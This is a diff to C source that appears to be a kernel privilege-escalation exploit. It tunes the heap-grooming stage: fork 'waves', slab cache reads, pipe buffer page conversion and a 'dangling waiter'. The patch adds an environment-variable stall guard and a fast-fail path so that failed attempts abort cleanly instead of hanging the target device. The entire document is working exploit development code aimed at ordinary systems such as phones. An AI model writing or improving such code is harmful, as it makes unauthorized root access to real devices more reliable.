@@ -420,6 +420,18 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   int taken_wave = -1;
   int target_owned = 0;
   uint64_t tsc = 0;
+  /* app-domain stall guard (round11 hang): the target page frozen on a
+   * per-cpu slab (inuse=0 frozen=1) never flips -- 24 waves x ~110 clones
+   * burn ~2600 forks per prepare round while the route's dangling waiter is
+   * live, feeding PI-chain walks until the whole device locks up.  With
+   * KS_WAVE_FLAT_MAX=N (>0) abort the wave loop after N consecutive waves
+   * whose sc2 == tsc (zero rotation progress).  Default 0 = legacy full
+   * 24-wave sweep (shell-domain behaviour unchanged). */
+  int flat_max = 0;
+  const char *flat_env = getenv("KS_WAVE_FLAT_MAX");
+  if (flat_env && flat_env[0])
+    flat_max = atoi(flat_env);
+  int sc_flat = 0;
   for (int w = 0; w < CONVERT_MAX_WAVES; w++) {
     tsc = read_target_slab_cache(conv_fd, base);
     if (tsc == 0 && taken_wave >= 0) {
@@ -448,6 +460,16 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
       taken_wave = w;
     }
     /* else: wave consumed a buddy page above the target; hold it out. */
+    if (sc2 == tsc) {
+      if (flat_max > 0 && ++sc_flat >= flat_max) {
+        pr_warning("pipe convert wave flat x%d sc=%016llx unchanged; "
+                   "aborting wave loop\n", sc_flat,
+                   (unsigned long long)sc2);
+        break;
+      }
+    } else {
+      sc_flat = 0;
+    }
   }
   if (!target_owned && taken_wave >= 0 &&
       read_target_slab_cache(conv_fd, base) == 0) {
@@ -468,6 +490,14 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
             head, (unsigned long long)wflags, (unsigned long long)wmeta,
             (unsigned)(wmeta & 0xffffu), (unsigned)((wmeta >> 16) & 0x7fffu),
             (int)((wmeta >> 31) & 1u));
+    /* Fail fast: with the page still pinned in the slab the drain/reclaim
+     * rounds below cannot flip it either (round11: owned=0 then 480+1024
+     * pipe allocs all wasted while the dangling waiter stayed exposed).
+     * Return 0 -> prepare fails -> attempt cap counts it -> clean abort. */
+    pr_warning("pipe prepare: target not owned after waves; skip drain "
+               "(fast fail)\n");
+    free(wave_pids);
+    return 0;
   }
 
   shape_pipe_cache();
